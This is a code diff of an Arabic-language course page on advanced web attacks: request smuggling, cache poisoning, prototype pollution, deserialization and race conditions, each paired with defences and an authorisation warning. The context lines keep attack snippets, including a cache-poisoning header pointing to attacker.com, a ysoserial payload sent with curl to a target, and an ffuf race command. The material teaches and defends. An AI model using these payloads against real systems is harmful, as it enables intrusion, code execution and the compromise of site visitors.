@@ -7,11 +7,41 @@ export default function Page() {
       <L
         ar={<>
           <Section title="الويب على مستوى الخبراء">
-            <Analogy>OWASP Top 10 هو الأبجدية. الدرس ده الأدب والشعر. هنا مش بنحقن قيمة في فورم، إحنا بنلعب على مستوى البروتوكول والمعمارية، في الأماكن اللي المطور بيفترض إن "الـ stack بيحمي نفسه".</Analogy>
+            <p>عرفت SQLi؟ XSS؟ IDOR؟ تمام.</p>
+            <p>- طب أنا حافظ Top 10، يبقى أنا web hacker مظبوط؟</p>
+            <p>يا مستجد. الـ Top 10 ده الأبجدية. إحنا هنا بنقرا أدب.</p>
+            <p>طب لما الـ frontend والـ backend يختلفوا في تفسير نفس الـ HTTP request؟</p>
+            <p>طب لما تخدع الـ cache يخزّن صفحة الضحية الشخصية (بكل بياناته جواها)، وتيجي إنت بعدها تطلبها بنفس الـ URL وتلاقيها قدامك جاهزة؟</p>
+            <p>طب لما تمرّر CRLF في header فتحقن response جديد بالكامل؟</p>
+            <Analogy>
+              في الـ OWASP Top 10، الثغرة بتبقى في كود المبرمج — هو كاتب <code>SELECT * FROM users WHERE id = $input</code> من غير ما يـ sanitize. تمام، الغلطة واضحة، والإصلاح واضح.
+              <br/><br/>
+              هنا في الدرس ده، المبرمج كاتب كوده صح. مفيش غلطة في كوده هو.
+              <br/>
+              الثغرة عايشة في الفجوة بين <b>الـ components</b> اللي طلبه ماشي بينهم: الـ CDN، الـ load balancer، الـ reverse proxy، الـ backend. كل واحد منهم منتج شركة مختلفة، وكل واحد قارا الـ RFC وفهمه بطريقته الخاصة.
+              <br/><br/>
+              تخيّل خطاب بيوصلك من السفارة. مرّ على 4 موظفين قبل ما يوصلك:
+              <br/>
+              الأول قراه إن الموعد يوم الأحد، التاني قراه يوم الاتنين، التالت ختمه على الأحد، الرابع وقّع على الاتنين.
+              <br/>
+              المهاجم بيستغل الفرق ده. بيبعت طلب HTTP الـ frontend بيقراه على إنه طلب واحد، والـ backend بيقراه على إنه اتنين. أو الـ cache بيخزّنه كصفحة عامة، والـ origin بيرجّعها كصفحة شخصية.
+              <br/><br/>
+              <b>الكود مش غلط. الفهم بين الأطراف هو اللي غلط.</b> والمهاجم بيعيش في الفجوة دي.
+            </Analogy>
             <Callout kind="danger" title="إذن رسمي فقط">
-              كل التكنيكات هنا ضمن اختبارات اختراق رسمية (red team / bug bounty). تطبيقها على هدف من غير
-              تفويض = جريمة فيدرالية. خلي بالك.
+              كل التكنيكات هنا ضمن اختبارات اختراق رسمية (red team / bug bounty).
+              تطبيقها على هدف من غير تفويض = جريمة فيدرالية تحت CFAA.
+              مش "خلي بالك" — ده "هتدخل سجن".
             </Callout>
+          </Section>
+
+          <Section title="حكاية: PortSwigger Top 10 of 2019 — Request Smuggling رجع من الموت">
+            <Callout kind="info" title="بُص بقى">
+              James Kettle (Albinowax) في 2019 رجّع تكنيك من 2005 كان الناس فاكراه مات. اللي بيحصل فعلياً؟ في 6 شهور، Bug bounty payouts بأكتر من نص مليون دولار من شركات عملاقة (Slack, PayPal, Atlassian).
+              الثغرة الأصلية اتنشرت في 2005 من Watchfire. الناس قالوا "حُلّت".
+              في 2019: HTTP/2 و CDN-frontends جداد جابوها تاني، بأضعاف القوة.
+            </Callout>
+            <p>الدرس: الثغرات القديمة ما بتموتش — بترجع كل ما الـ stack يتغيّر. اللي اتعلم البروتوكول من الجذر، بيلاقي الثغرات قبل ما تتنشر.</p>
           </Section>
 
           <Section title="HTTP Request Smuggling — لما الـ frontend والـ backend يختلفوا">
@@ -48,7 +78,7 @@ SMUGGLED`}</Code>
               <li><b>h2cSmuggler</b>.</li>
               <li>Burp Repeater مع timing differential analysis.</li>
             </ul>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               <ol>
                 <li>HTTP/2 من الأول للآخر (مفيش downgrade للـ backend).</li>
                 <li>ارفض أي request جاي بـ Content-Length و Transfer-Encoding مع بعض.</li>
@@ -59,7 +89,7 @@ SMUGGLED`}</Code>
             </Callout>
           </Section>
 
-          <Section title="HTTP/2 و gRPC — سطح هجوم جديد بالكامل">
+          <Section title="HTTP/2 و gRPC — جبهة جديدة بالكامل">
             <ul>
               <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS عبر فتح streams و إغلاقها فوراً.</li>
               <li><b>HPACK bombs</b> — header compression للضغط على الـ memory.</li>
@@ -80,7 +110,7 @@ X-Forwarded-Host: attacker.com
 
 # 3) الـ cache يحفظ النتيجة. كل زائر تالٍ يحمّل JS من المهاجم.`}</Code>
             <p>الأداة: <b>Param Miner</b> (Burp) عشان تكتشف الـ unkeyed inputs.</p>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               متعكسش headers مش موثوقة في الرد. ضيف كل header مؤثر للـ <code>Vary</code> أو للـ cache key. وطبّق
               <b> normalization</b> صارم على مستوى الـ CDN.
             </Callout>
@@ -112,7 +142,7 @@ function merge(target, source) {
 // الآن: ({}).isAdmin === true لكل object في التطبيق!`}</Code>
             <p>فيه Gadget chains معروفة على Express وLodash وjQuery بتحول الـ PP لـ RCE كامل.</p>
             <p>الأدوات: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               <ul>
                 <li>استخدم <b>Map</b> و <b>Object.create(null)</b> بدل الـ plain objects.</li>
                 <li>اعمل <b>Object.freeze(Object.prototype)</b> في الـ entrypoint.</li>
@@ -147,7 +177,7 @@ java -jar ysoserial.jar CommonsCollections1 'id' | base64
 curl -X POST https://target/api/import \\
   -H "Content-Type: application/x-java-serialized-object" \\
   --data-binary @payload.bin`}</Code>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               <ul>
                 <li>متعملش deserialization على داتا جاية من بره أصلاً. ده الحل الصح.</li>
                 <li>لو مضطر: whitelist صارم للـ classes (LookAheadObjectInputStream).</li>
@@ -179,7 +209,7 @@ curl -X POST https://target/api/import \\
               <li><b>Mutation race conditions</b>: aliases كتير عشان تستهلك نقاط reward قبل ما يتفحصوا.</li>
               <li>auth ضعيف على resolvers معينة لأن حد نسي يحط الفحص.</li>
             </ul>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               query depth limit + cost analysis + rate limit per IP/user + <b>persisted queries</b> بس مفيش غيرها.
             </Callout>
           </Section>
@@ -195,7 +225,7 @@ ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
               <li><b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) بيبعت عشرات الـ requests في TCP packet واحدة.</li>
               <li>التأثير: سحب رصيد متكرر، تخطي email verification، حجز اسم يوزر محجوز لحد تاني.</li>
             </ul>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الحماية">
               <ol>
                 <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
                 <li>Idempotency keys على كل عملية حساسة.</li>
@@ -213,6 +243,27 @@ ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
               <li><b>وصّل الثغرات ببعض</b>: SSRF صغير + open redirect + IDOR = اختراق كامل.</li>
               <li><b>وثّق proof-of-impact</b> بشكل واضح للـ blue team.</li>
             </ol>
+          </Section>
+
+          <Section title="غلطات الـ junior في الويب المتقدم">
+            <Callout kind="danger" title="اللي بيحصل">
+              <ul>
+                <li><b>يجرّب smuggling payloads عشوائي</b> — من غير ما يفهم الـ frontend والـ backend اللي قدامه. الـ payload بتاع CL.TE مش هيشتغل على HTTP/2 endpoint.</li>
+                <li><b>يقول "Race condition" على كل حاجة</b> — في فرق بين race حقيقي وبين "السيرفر استجاب مرتين مع بعض". لازم تثبت impact.</li>
+                <li><b>يفتكر إن CSP بتقفل XSS</b> — الـ CSP فيها 1000 bypass: JSONP endpoints, base-uri, dangling markup. اقرا CSP Evaluator قبل ما تقول "محمي".</li>
+                <li><b>ينسى الـ secondary context</b> — SSTI ممكن تطلع في email templates، PDF generators، error pages. مش بس الـ main view.</li>
+                <li><b>يبلّغ بـ "تكنيك" بدل "impact"</b> — "لقيت CRLF" مش finding. "لقيت CRLF بستخدمه أحقن Set-Cookie فأسرق session" دي finding.</li>
+              </ul>
+            </Callout>
+          </Section>
+
+          <Section title="الخلاصة الناشفة">
+            <p>الويب المتقدم مش تقنيات أكتر — هو فهم أعمق.</p>
+            <p>كل bug class هنا (smuggling, cache poisoning, SSTI, race conditions) بتطلع من نفس المبدأ: <b>اتنين components بيختلفوا في تفسير نفس البيانات</b>.</p>
+            <p>اللي بيتعلم المبدأ، بيلاقي الـ bug في أي stack.</p>
+            <p>اللي بيحفظ payloads، بيلاقي الـ bugs اللي اتنشرت — ومش بيلاقي حاجة جديدة أبداً.</p>
+            <p>اكتبها على غلاف الكشكول:</p>
+            <p><b>الثغرة بتعيش في الفجوة بين اتنين components بيختلفوا في الفهم. دوّر على الفجوة، مش على الـ payload.</b></p>
           </Section>
         </>}
         en={<>
